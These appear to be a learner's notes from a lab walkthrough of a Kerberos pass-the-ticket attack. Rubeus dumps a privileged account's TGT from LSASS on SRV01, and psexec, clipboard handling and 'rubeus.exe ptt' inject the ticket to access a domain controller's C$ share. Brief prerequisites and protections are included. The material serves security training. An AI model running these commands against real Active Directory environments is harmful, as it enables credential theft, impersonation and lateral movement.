
To see : 

Source : 


Kerberos

rubeus.exe dump /user:katrina.mendoza.adm /service:krbtgt

rubeus.exe ptt /ticket:


Extract the TGT from the LSASS memory 
	▪ This requires the seDebugPrivilege 
	▪ Requires that the targeted identity has cached its credentials 
Inject the TGT into your current session 
	▪ Either locally, or later on other systems by exporting it to a file 
	▪ The “new” ticket is used to request new service tickets 
Does not trigger any failed authentication attempts

This is possible because the hash is in the memory Needed for Single Sign-On


Attack’s pre-requisites Protection - A victim is connected to the system, or a service is running under a user account - seDebugPrivilege, or LSASS memory dump 
Protection
- Healthy administration practices (do not connect to untrusted systems with privileged accounts, use RDP restricted mode or remote credential guard)



## Step of pass-the-ticket attack

Try to steal the TGT of a privileged account to impersonate his or her on other system without knowing her password.



### Export tickets out of SRV

 `psexec.exe \\SRV01 cmd.exe -accepteula`

```powershell
rubeus.exe dump /user:katrina.mendoza.adm /service:krbtgt
```

Result : 
![[Pasted image 20231024213403.png]]

Save the result in `C:\Users\Public\tgt.txt`

### Inject stolen tickets into memory

Put the base64 ticket into your clipboard. In the **Windows Terminal** window, run `(Get-Content C:\Users\Public\tgt.txt) -join "" -replace " " | clip`.

Run klist. It should return a bunch of Kerberos ticket. The one for your current session. Note that all of them are for the Client: red @ CONTOSO.COM. Those tickets were obtains thanks to our TGT. You can see the TGT by running klist tgt. It should look like this: 
![[Pasted image 20231024213850.png]]

4. Change the active directory by running `cd \Tools\Ghostpack` and then type but do not execute `rubeus.exe ptt /ticket:` then before hitting Enter, make sure you place your cursor on the terminal and do a right click anywhere in the console. This should paste the content of your clipboard in the console. Then hit **Enter**. It should look like this: ![v2nlpjjb.png](https://labondemand.blob.core.windows.net/content/lab127288/v2nlpjjb.png)
    
5. Still in the **Windows Terminal** window, run `klist`. All your tickets are gone and being replaced by the one you've stolen from SRV01.
    
6. In the same console, try again to browse the C$ share of a domain controller by running `dir \\DC01\C$`.
    

List all tickets by running `klist`. You now have three tickets:
![[Pasted image 20231024213937.png]]


